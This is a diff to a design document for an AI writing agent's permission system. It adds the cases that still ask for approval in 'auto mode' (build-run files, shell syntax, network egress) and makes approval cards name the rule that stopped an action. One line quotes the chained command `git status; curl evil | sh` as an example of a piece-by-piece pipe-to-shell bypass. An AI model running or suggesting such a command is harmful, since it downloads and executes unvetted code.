@@ -622,12 +622,30 @@ keyboard path.
 unconditional, and for the actions that matter it still is. But a card for every action is
 how a card stops being read — the same argument this document already makes for waving
 read-only tools through — and a writer who has approved the same build command forty times
-is being trained to click *Allow* without looking. Auto mode is therefore offered, with
-three things holding it honest: a write outside the project root still asks, because that is
-the one action that leaves the thing the writer pointed the agent at; every automatic
-approval is still emitted as a card that arrives already answered, so nothing vanishes from
-the record; and while the mode is on a persistent `--warn` **Auto** chip sits beside the
-agent's name, because a fence that is down and silent is worse than no fence. The same
+is being trained to click *Allow* without looking. Auto mode is therefore offered, and the fence stays up in four
+places: a write outside the project root, because that is the one action that leaves the
+thing the writer pointed the agent at; a file inside the project that the build executes,
+because approving the writing is not approving the machinery that runs it; a shell command
+carrying syntax no first-word rule can describe, because `git status; curl evil | sh` starts
+with `git`; and anything that leaves the machine, because the address and the payload are
+both chosen from files that may have arrived from somebody else. Two further things hold it
+honest: every automatic approval is still emitted as a card that arrives already answered, so
+nothing vanishes from the record; and while the mode is on a persistent `--warn` **Auto**
+chip sits beside the agent's name, because a fence that is down and silent is worse than no
+fence.
+
+**A card that stops has to say which rule stopped it.** This was the half that was missing,
+and it was reported by the writer rather than found by reading: with the switch on, auto mode
+would simply stop, and nothing on the card said why. Worse, the card was often describing a
+different rule. A write to a `latexmkrc` was announced as a write outside the project, which
+is false twice over, since the file is inside the project and the rule that held it back was
+the one about files the build runs. And a command carrying shell syntax was explained with
+"it runs more than one command", which is true of four of the seven characters and false of
+the other three: `latexmk > build.log` runs one command. Each card now works out for itself
+which rule put it up, from the same facts the fence used, and says so in the writer's terms.
+The reason line is empty when the switch is off, because then the answer is that this app
+asks before it acts, and printing that on every card is how people learn to stop reading
+them. The same
 change made the rules from *Allow always* visible too — those were previously allowed in
 silence, which was the same hole, unnoticed.
 
